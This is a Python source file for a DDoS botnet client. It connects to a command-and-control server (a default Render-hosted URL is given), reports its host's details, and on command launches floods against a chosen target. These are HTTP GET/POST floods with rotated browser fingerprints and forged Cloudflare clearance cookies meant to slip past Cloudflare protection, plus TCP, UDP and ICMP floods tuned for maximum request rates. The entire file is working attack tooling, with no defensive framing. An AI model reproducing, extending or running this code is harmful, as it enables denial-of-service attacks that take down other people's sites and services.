#!/usr/bin/env python3
"""
C2 Client - Cloudflare Bypass with Advanced Browser Simulation
Ultra-powerful with keep-alive connections - OPTIMIZED
"""
import socketio
import socket
import random
import string
import threading
import time
import sys
import os
import platform
import psutil
import urllib3
import subprocess
import hashlib
import resource
from datetime import datetime
from urllib.parse import urlparse, urlencode
from concurrent.futures import ThreadPoolExecutor
from multiprocessing import Process, Queue

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set file descriptor limits at startup
try:
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    resource.setrlimit(resource.RLIMIT_NOFILE, (min(65536, hard), hard))
    print(f"[*] File descriptor limit set to: {min(65536, hard)}")
except:
    pass

class CloudflareBypassEngine:
    """Advanced attack engine with Cloudflare bypass capabilities"""
    
    def __init__(self):
        self.running = False
        self.stats = {
            'requests': 0,
            'success': 0,
            'failed': 0,
            'bytes_sent': 0
        }
        self.stats_lock = threading.Lock()
        self.pools = []
        
        # Advanced browser fingerprints for Cloudflare bypass
        self.browser_profiles = {
            'chrome_120': {
                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec_ch_ua_mobile': '?0',
                'sec_ch_ua_platform': '"Windows"',
            },
            'chrome_119': {
                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                'sec_ch_ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                'sec_ch_ua_mobile': '?0',
                'sec_ch_ua_platform': '"Windows"',
            },
            'firefox_121': {
                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            },
            'safari_17': {
                'user_agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15',
            },
            'edge_120': {
                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
                'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
                'sec_ch_ua_mobile': '?0',
                'sec_ch_ua_platform': '"Windows"',
            }
        }
        
        # TLS fingerprints
        self.tls_ciphers = [
            'ECDHE-RSA-AES128-GCM-SHA256',
            'ECDHE-RSA-AES256-GCM-SHA384',
            'ECDHE-ECDSA-AES128-GCM-SHA256',
            'ECDHE-ECDSA-AES256-GCM-SHA384'
        ]
    
    def generate_cloudflare_headers(self, target_url):
        """Generate headers that bypass Cloudflare"""
        profile = random.choice(list(self.browser_profiles.values()))
        
        headers = {
            'User-Agent': profile['user_agent'],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': random.choice([
                'en-US,en;q=0.9',
                'en-GB,en;q=0.9',
                'en-US,en;q=0.9,es;q=0.8',
                'en-US,en;q=0.9,fr;q=0.8'
            ]),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        }
        
        # Add Chrome-specific headers
        if 'sec_ch_ua' in profile:
            headers['Sec-Ch-Ua'] = profile['sec_ch_ua']
            headers['Sec-Ch-Ua-Mobile'] = profile['sec_ch_ua_mobile']
            headers['Sec-Ch-Ua-Platform'] = profile['sec_ch_ua_platform']
        
        # Add referer (important for Cloudflare)
        parsed = urlparse(target_url)
        headers['Referer'] = f"{parsed.scheme}://{parsed.netloc}/"
        headers['Origin'] = f"{parsed.scheme}://{parsed.netloc}"
        
        # Add DNT
        if random.random() < 0.5:
            headers['DNT'] = '1'
        
        return headers
    
    def generate_realistic_cookies(self):
        """Generate realistic browser cookies"""
        cookies = {}
        
        # Session ID
        cookies['_ga'] = f"GA1.1.{random.randint(100000000, 999999999)}.{int(time.time())}"
        cookies['_gid'] = f"GA1.1.{random.randint(100000000, 999999999)}.{int(time.time())}"
        
        # Session token
        cookies['session'] = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        
        # Tracking
        cookies['_fbp'] = f"fb.1.{int(time.time())}.{random.randint(100000000, 999999999)}"
        
        # Cloudflare clearance (simulated)
        cookies['cf_clearance'] = ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=64))
        
        return cookies
    
    # ============= CLOUDFLARE BYPASS HTTP FLOOD =============
    
    def cloudflare_bypass_flood(self, target, duration, method='GET', threads=1000):
        """Advanced HTTP flood with Cloudflare bypass - MAXIMUM SPEED"""
        print(f"[L7] Starting CLOUDFLARE BYPASS {method} flood on {target}")
        print(f"[L7] Threads: {threads} | Expected RPS: {threads * 50}+")
        self.running = True
        
        # Optimized pool count to avoid file descriptor issues
        pool_count = min(20, max(5, threads // 50))  # Dynamic based on threads
        print(f"[L7] Creating {pool_count} connection pools...")
        
        for _ in range(pool_count):
            pool = urllib3.PoolManager(
                maxsize=min(500, threads // pool_count),  # Scale with threads
                retries=False,  # No retries for speed
                timeout=urllib3.Timeout(connect=1, read=2),
                cert_reqs='CERT_NONE',
                assert_hostname=False,
                num_pools=20,
                block=False
            )
            self.pools.append(pool)
        
        # Cloudflare-aware paths
        paths = [
            '/',
            '/index.html',
            '/api/status',
            '/search',
            '/products',
            '/about',
            '/contact',
            '/blog',
            '/news',
            '/services'
        ]
        
        # Realistic query parameters
        params_templates = [
            {'utm_source': 'google', 'utm_medium': 'organic'},
            {'ref': 'homepage', 'source': 'direct'},
            {'page': '1', 'limit': '20'},
            {'category': 'all', 'sort': 'recent'},
            {'lang': 'en', 'region': 'us'}
        ]
        
        start_time = time.time()
        request_count = 0
        
        def worker():
            nonlocal request_count
            pool_idx = 0
            session_cookies = self.generate_realistic_cookies()
            
            while self.running and time.time() - start_time < duration:
                try:
                    # Rotate pools
                    pool = self.pools[pool_idx % len(self.pools)]
                    pool_idx += 1
                    
                    # Build realistic URL
                    timestamp = int(time.time() * 1000)
                    path = random.choice(paths)
                    params = random.choice(params_templates).copy()
                    params['_'] = str(timestamp)
                    params['rand'] = ''.join(random.choices(string.ascii_lowercase, k=8))
                    
                    query_string = urlencode(params)
                    url = f"{target.rstrip('/')}{path}?{query_string}"
                    
                    # Generate Cloudflare bypass headers
                    headers = self.generate_cloudflare_headers(target)
                    
                    # Add cookies as header
                    cookie_str = '; '.join(f'{k}={v}' for k, v in session_cookies.items())
                    headers['Cookie'] = cookie_str
                    
                    # Prepare request with reduced timeouts for speed
                    kwargs = {
                        'headers': headers,
                        'timeout': urllib3.Timeout(connect=2, read=3),
                        'retries': False,  # No retries for max speed
                        'preload_content': False,
                        'redirect': False  # No redirects for speed
                    }
                    
                    if method == 'POST':
                        # Realistic POST data
                        post_data = urlencode({
                            'action': random.choice(['search', 'login', 'submit', 'verify']),
                            'token': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                            'timestamp': str(int(time.time())),
                            'data': ''.join(random.choices(string.ascii_letters, k=50))
                        })
                        kwargs['body'] = post_data.encode()
                        headers['Content-Type'] = 'application/x-www-form-urlencoded'
                        headers['Content-Length'] = str(len(post_data))
                    
                    # Send request
                    response = pool.request(method, url, **kwargs)
                    
                    # Update session cookies from response
                    if 'Set-Cookie' in response.headers:
                        # Parse and update cookies (simplified)
                        cookie_header = response.headers['Set-Cookie']
                        for cookie in cookie_header.split(';'):
                            if '=' in cookie:
                                key, val = cookie.split('=', 1)
                                session_cookies[key.strip()] = val.strip()
                    
                    with self.stats_lock:
                        self.stats['requests'] += 1
                        # Accept more status codes as success
                        if response.status < 500 and response.status != 403:
                            self.stats['success'] += 1
                        else:
                            self.stats['failed'] += 1
                    
                    # Properly close the response
                    try:
                        response.drain_conn()
                        response.release_conn()
                    except:
                        pass
                    
                    request_count += 1
                    
                    # Remove delay for maximum speed
                    # time.sleep(random.uniform(0.001, 0.005))
                    
                except OSError as e:
                    # Handle file descriptor exhaustion gracefully
                    if "Too many open files" in str(e):
                        time.sleep(0.1)  # Back off when hitting limits
                    with self.stats_lock:
                        self.stats['failed'] += 1
                except Exception as e:
                    with self.stats_lock:
                        self.stats['failed'] += 1
        
        # Start worker threads
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker) for _ in range(threads)]
            
            # Keep connection alive by monitoring
            while time.time() - start_time < duration and self.running:
                time.sleep(1)
            
            self.running = False
            
            # Cancel remaining
            for future in futures:
                future.cancel()
        
        # Cleanup pools properly
        for pool in self.pools:
            try:
                pool.clear()
            except:
                pass
        self.pools = []  # Clear the pool list
        
        return self.stats.copy()
    
    # ============= TCP ATTACKS =============
    
    def tcp_power_flood(self, target, duration, threads=400):
        """Powerful TCP SYN flood - MAXIMUM SPEED"""
        print(f"[L4] Starting POWERFUL TCP flood on {target}")
        self.running = True
        
        parsed = urlparse(target) if target.startswith('http') else type('obj', (object,), {'netloc': target})()
        host = parsed.netloc.split(':')[0] if hasattr(parsed, 'netloc') else target.split(':')[0]
        port = int(parsed.netloc.split(':')[1]) if ':' in (parsed.netloc if hasattr(parsed, 'netloc') else target) else 80
        
        start_time = time.time()
        
        def worker():
            while self.running and time.time() - start_time < duration:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.3)  # Faster timeout
                    s.connect((host, port))
                    
                    # Send realistic HTTP-like data
                    data = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n".encode()
                    s.send(data)
                    s.close()
                    
                    with self.stats_lock:
                        self.stats['requests'] += 1
                        self.stats['success'] += 1
                        self.stats['bytes_sent'] += len(data)
                except:
                    with self.stats_lock:
                        self.stats['failed'] += 1
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker) for _ in range(threads)]
            
            while time.time() - start_time < duration and self.running:
                time.sleep(1)
            
            self.running = False
            
            for future in futures:
                future.cancel()
        
        return self.stats.copy()
    
    # ============= UDP ATTACKS =============
    
    def udp_power_flood(self, target, duration, threads=200):
        """Powerful UDP flood - MAXIMUM SPEED"""
        print(f"[L4] Starting POWERFUL UDP flood on {target}")
        self.running = True
        
        parsed = urlparse(target) if target.startswith('http') else type('obj', (object,), {'netloc': target})()
        host = parsed.netloc.split(':')[0] if hasattr(parsed, 'netloc') else target.split(':')[0]
        port = int(parsed.netloc.split(':')[1]) if ':' in (parsed.netloc if hasattr(parsed, 'netloc') else target) else 80
        
        start_time = time.time()
        
        # Pre-generate larger payloads for more impact
        payloads = [os.urandom(size) for size in [512, 1024, 2048, 4096, 8192, 16384, 32768, 65507]]
        
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while self.running and time.time() - start_time < duration:
                try:
                    payload = random.choice(payloads)
                    sock.sendto(payload, (host, port))
                    
                    with self.stats_lock:
                        self.stats['requests'] += 1
                        self.stats['success'] += 1
                        self.stats['bytes_sent'] += len(payload)
                except:
                    with self.stats_lock:
                        self.stats['failed'] += 1
            
            sock.close()
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker) for _ in range(threads)]
            
            while time.time() - start_time < duration and self.running:
                time.sleep(1)
            
            self.running = False
            
            for future in futures:
                future.cancel()
        
        return self.stats.copy()
    
    # ============= ICMP ATTACKS =============
    
    def icmp_power_flood(self, target, duration, threads=50):
        """Powerful ICMP flood"""
        print(f"[L3] Starting POWERFUL ICMP flood on {target}")
        self.running = True
        
        host = urlparse(target).netloc if target.startswith('http') else target
        host = host.split(':')[0]
        
        start_time = time.time()
        system = platform.system().lower()
        
        def worker():
            while self.running and time.time() - start_time < duration:
                try:
                    if system == "windows":
                        cmd = f"ping -n 1 -w 100 -l 1024 {host}"
                    else:
                        cmd = f"ping -c 1 -W 1 -s 1024 {host}"
                    
                    result = subprocess.run(cmd, shell=True, capture_output=True, timeout=2)
                    
                    with self.stats_lock:
                        self.stats['requests'] += 1
                        if result.returncode == 0:
                            self.stats['success'] += 1
                        else:
                            self.stats['failed'] += 1
                except:
                    with self.stats_lock:
                        self.stats['failed'] += 1
                
                time.sleep(0.01)
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker) for _ in range(threads)]
            
            while time.time() - start_time < duration and self.running:
                time.sleep(1)
            
            self.running = False
            
            for future in futures:
                future.cancel()
        
        return self.stats.copy()

class Layer7Client:
    """Client with Cloudflare bypass and persistent connection"""
    
    def __init__(self, server_url='http://localhost:5000', client_name=None):
        self.server_url = server_url
        self.client_name = client_name or f"{platform.node()}_{platform.system()}"
        
        # Enhanced SocketIO with keep-alive (removed invalid params)
        self.sio = socketio.Client(
            reconnection=True,
            reconnection_attempts=0,  # Infinite
            reconnection_delay=1,
            reconnection_delay_max=5,
            logger=False,
            engineio_logger=False
        )
        
        self.current_attack = None
        self.running = False
        self.attack_thread = None
        self.attack_process = None
        self.attack_engine = CloudflareBypassEngine()
        self.last_heartbeat = time.time()
        self.connection_keeper = None
        
        self.setup_handlers()
        
        self.client_info = {
            'name': self.client_name,
            'hostname': platform.node(),
            'platform': platform.platform(),
            'cpu_count': psutil.cpu_count(),
            'memory_total': psutil.virtual_memory().total,
            'python_version': platform.python_version(),
            'has_layer7': True,
            'cloudflare_bypass': True
        }
    
    def setup_handlers(self):
        """Setup SocketIO event handlers"""
        @self.sio.event
        def connect():
            print(f"✅ Connected to C2 Server: {self.server_url}")
            self.last_heartbeat = time.time()
            self.register_client()
        
        @self.sio.event
        def connect_error(data):
            print(f"❌ Connection failed: {data}")
            print("💡 Retrying connection...")
        
        @self.sio.event
        def disconnect():
            print("⚠️ Disconnected from server")
            print("🔄 Reconnecting...")
            self.running = False
        
        @self.sio.event
        def welcome(data):
            print(f"📢 Server: {data['message']}")
            self.last_heartbeat = time.time()
        
        @self.sio.event
        def attack_command(data):
            self.last_heartbeat = time.time()
            print(f"\n🎯 Received attack command")
            print(f"   Target: {data.get('target')}")
            print(f"   Method: {data.get('method')}")
            print(f"   Duration: {data.get('duration')}s")
            
            if data.get('command') == 'start':
                self.current_attack = data.get('attack_id')
                self.start_attack(data)
            elif data.get('command') == 'stop':
                self.stop_attack()
        
        @self.sio.on('pong')
        def on_pong():
            self.last_heartbeat = time.time()
    
    def register_client(self):
        """Register client with server"""
        try:
            self.sio.emit('client_register', self.client_info)
            print(f"✅ Registered as: {self.client_name}")
        except Exception as e:
            print(f"⚠️ Registration error: {e}")
    
    def connection_keeper_loop(self):
        """Dedicated thread to keep connection alive during attacks"""
        while True:
            try:
                if self.sio.connected:
                    # Send lightweight pings
                    self.sio.emit('ping', {'timestamp': time.time(), 'keepalive': True})
                    self.last_heartbeat = time.time()
                time.sleep(3)  # Ping every 3 seconds
            except:
                time.sleep(3)
    
    def start_attack(self, attack_data):
        """Start attack execution"""
        if self.attack_thread and self.attack_thread.is_alive():
            print("⚠️ Another attack is already running")
            return
        
        self.running = True
        self.attack_thread = threading.Thread(
            target=self.execute_attack,
            args=(attack_data,),
            daemon=True
        )
        self.attack_thread.start()
        
        try:
            self.sio.emit('attack_started', {
                'attack_id': attack_data.get('attack_id'),
                'target': attack_data.get('target')
            })
        except Exception as e:
            print(f"⚠️ Failed to notify server: {e}")
    
    def execute_attack(self, attack_data):
        """Execute POWERFUL attack with Cloudflare bypass"""
        attack_id = attack_data.get('attack_id')
        target = attack_data.get('target')
        method = attack_data.get('method', 'http').lower()
        duration = attack_data.get('duration', 60)
        
        # Calculate thread count based on CPU - with smart limits
        cpu_count = psutil.cpu_count()
        
        # Optimized thread counts to prevent file descriptor exhaustion
        thread_counts = {
            'http': min(cpu_count * 100, 600),  # Max 600 threads
            'get': min(cpu_count * 100, 600),
            'post': min(cpu_count * 100, 600),
            'tcp': min(cpu_count * 50, 300),
            'udp': min(cpu_count * 40, 200),
            'icmp': min(cpu_count * 15, 100),
            'ping': min(cpu_count * 15, 100)
        }
        threads = thread_counts.get(method, 600)
        
        try:
            print(f"\n{'='*60}")
            print(f"💥 EXECUTING CLOUDFLARE BYPASS ATTACK")
            print(f"   Target: {target}")
            print(f"   Method: {method.upper()}")
            print(f"   Duration: {duration}s")
            print(f"   Threads: {threads}")
            print(f"   Power: OPTIMIZED + CF BYPASS")
            print(f"   Expected RPS: {threads * 50}+")
            print(f"{'='*60}\n")
            
            start_time = time.time()
            
            # Reset stats
            self.attack_engine.stats = {
                'requests': 0, 'success': 0, 'failed': 0, 'bytes_sent': 0
            }
            
            # Execute powerful attack with Cloudflare bypass
            if method in ['http', 'get']:
                results = self.attack_engine.cloudflare_bypass_flood(target, duration, 'GET', threads)
            elif method == 'post':
                results = self.attack_engine.cloudflare_bypass_flood(target, duration, 'POST', threads)
            elif method == 'tcp':
                results = self.attack_engine.tcp_power_flood(target, duration, threads)
            elif method == 'udp':
                results = self.attack_engine.udp_power_flood(target, duration, threads)
            elif method in ['icmp', 'ping']:
                results = self.attack_engine.icmp_power_flood(target, duration, threads)
            else:
                results = self.attack_engine.cloudflare_bypass_flood(target, duration, 'GET', threads)
            
            elapsed = time.time() - start_time
            actual_rps = results['requests'] / elapsed if elapsed > 0 else 0
            success_rate = (results['success'] / results['requests'] * 100) if results['requests'] > 0 else 0
            
            # Report completion
            try:
                self.sio.emit('attack_complete', {
                    'attack_id': attack_id,
                    'results': {
                        'requests': results['requests'],
                        'success': success_rate,
                        'rps': actual_rps,
                        'duration': elapsed,
                        'method': method,
                        'bytes_sent': results['bytes_sent']
                    }
                })
            except Exception as e:
                print(f"⚠️ Failed to report completion: {e}")
            
            print(f"\n✅ Attack completed in {elapsed:.1f}s")
            print(f"   💥 Total Requests: {results['requests']:,}")
            print(f"   ✅ Successful: {results['success']:,}")
            print(f"   ❌ Failed: {results['failed']:,}")
            print(f"   ⚡ RPS: {actual_rps:.1f}")
            print(f"   📊 Success Rate: {success_rate:.1f}%")
            print(f"   📦 Data Sent: {results['bytes_sent'] / 1024 / 1024:.2f} MB")
            
        except Exception as e:
            print(f"\n❌ Attack error: {str(e)}")
            try:
                self.sio.emit('attack_error', {
                    'attack_id': attack_id,
                    'error': str(e)
                })
            except:
                pass
        finally:
            self.running = False
            self.attack_engine.running = False
            self.current_attack = None
    
    def stop_attack(self):
        """Stop current attack"""
        self.running = False
        self.attack_engine.running = False
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join(timeout=5)
        self.current_attack = None
        print("🛑 Attack stopped by server")
    
    def heartbeat_monitor(self):
        """Monitor connection and send heartbeats - PRIORITY THREAD"""
        consecutive_errors = 0
        
        while True:
            try:
                if self.sio.connected:
                    # Send heartbeat every 15 seconds (more frequent)
                    if time.time() - self.last_heartbeat > 15:
                        try:
                            self.sio.emit('ping', {'timestamp': time.time()})
                            self.last_heartbeat = time.time()
                            consecutive_errors = 0  # Reset error count
                        except:
                            consecutive_errors += 1
                    
                    # Report stats - with error handling
                    try:
                        # Use cached values to avoid opening /proc/stat repeatedly
                        cpu_usage = 0  # Skip CPU check during attack to avoid file descriptors
                        memory_usage = psutil.virtual_memory().percent
                        
                        stats = {
                            'cpu_usage': cpu_usage,
                            'memory_usage': memory_usage,
                            'timestamp': datetime.now().isoformat(),
                            'is_attacking': self.running
                        }
                        
                        self.sio.emit('client_stats', {'stats': stats})
                    except (OSError, IOError):
                        # Skip stats if file descriptors exhausted
                        pass
                    except:
                        pass
                else:
                    # Try to reconnect if disconnected
                    if consecutive_errors < 3:  # Don't spam reconnects
                        try:
                            if not self.sio.connected:
                                self.sio.connect(
                                    self.server_url,
                                    wait_timeout=10,
                                    transports=['websocket', 'polling']
                                )
                                consecutive_errors = 0
                        except:
                            consecutive_errors += 1
                
                time.sleep(5)  # Check every 5 seconds
            except (OSError, IOError):
                # File descriptor issue - just skip
                time.sleep(5)
            except Exception as e:
                # Only print non-file-descriptor errors
                if "Too many open files" not in str(e) and "/proc/stat" not in str(e):
                    print(f"\r⚠️ Heartbeat error: {e}", end='', flush=True)
                time.sleep(5)
    
    def connect(self):
        """Connect to server and start monitoring"""
        try:
            print("\n" + "="*60)
            print("💥 LAYER7 CLOUDFLARE BYPASS CLIENT")
            print(f"🔗 Connecting to: {self.server_url}")
            print(f"🏷️  Client: {self.client_name}")
            print(f"💻 Platform: {platform.platform()}")
            print(f"⚡ CPUs: {psutil.cpu_count()} cores")
            print(f"💾 RAM: {psutil.virtual_memory().total / 1024 / 1024 / 1024:.1f} GB")
            print(f"🛡️  Cloudflare Bypass: ENABLED")
            print(f"🔥 Power Level: OPTIMIZED FOR STABILITY")
            print(f"📁 File Descriptors: Optimized")
            print("="*60 + "\n")
            
            print("⚡ Connecting with keep-alive...")
            print("📡 This may take 10-30 seconds for Render servers...")
            
            self.sio.connect(
                self.server_url,
                wait_timeout=30,
                transports=['websocket', 'polling']
            )
            
            print("\n✅ Connection successful!")
            print("📡 Keep-alive enabled - connection will persist")
            print("⚡ Waiting for attack commands...")
            print("💡 Press Ctrl+C to disconnect\n")
            
            # Start heartbeat monitor with higher priority
            heartbeat_thread = threading.Thread(target=self.heartbeat_monitor, daemon=True)
            heartbeat_thread.start()
            
            # Start dedicated connection keeper
            self.connection_keeper = threading.Thread(target=self.connection_keeper_loop, daemon=True)
            self.connection_keeper.start()
            
            print("✅ Connection monitoring active!")
            
            while True:
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n🛑 Client stopped by user")
            self.disconnect()
        except Exception as e:
            print(f"\n❌ Connection error: {str(e)}")
            self.disconnect()
    
    def disconnect(self):
        """Disconnect from server"""
        self.running = False
        self.attack_engine.running = False
        if self.sio.connected:
            try:
                self.sio.disconnect()
            except:
                pass

def main():
    """Main function"""
    print("""
    ╔══════════════════════════════════════╗
    ║  LAYER7 CLOUDFLARE BYPASS CLIENT    ║
    ║  Maximum Performance Engine         ║
    ║  Advanced Browser Simulation        ║
    ║  Persistent Keep-Alive Connection   ║
    ╚══════════════════════════════════════╝
    """)
    
    default_server = "https://c2-server-io.onrender.com"
    
    server_url = input(f"🌐 C2 Server URL [{default_server}]: ").strip()
    if not server_url:
        server_url = default_server
    
    if not server_url.startswith('http'):
        server_url = 'https://' + server_url
    
    client_name = input(f"🏷️  Client Name [{platform.node()}]: ").strip()
    if not client_name:
        client_name = platform.node()
    
    client = Layer7Client(server_url=server_url, client_name=client_name)
    client.connect()

if __name__ == "__main__":
    main()
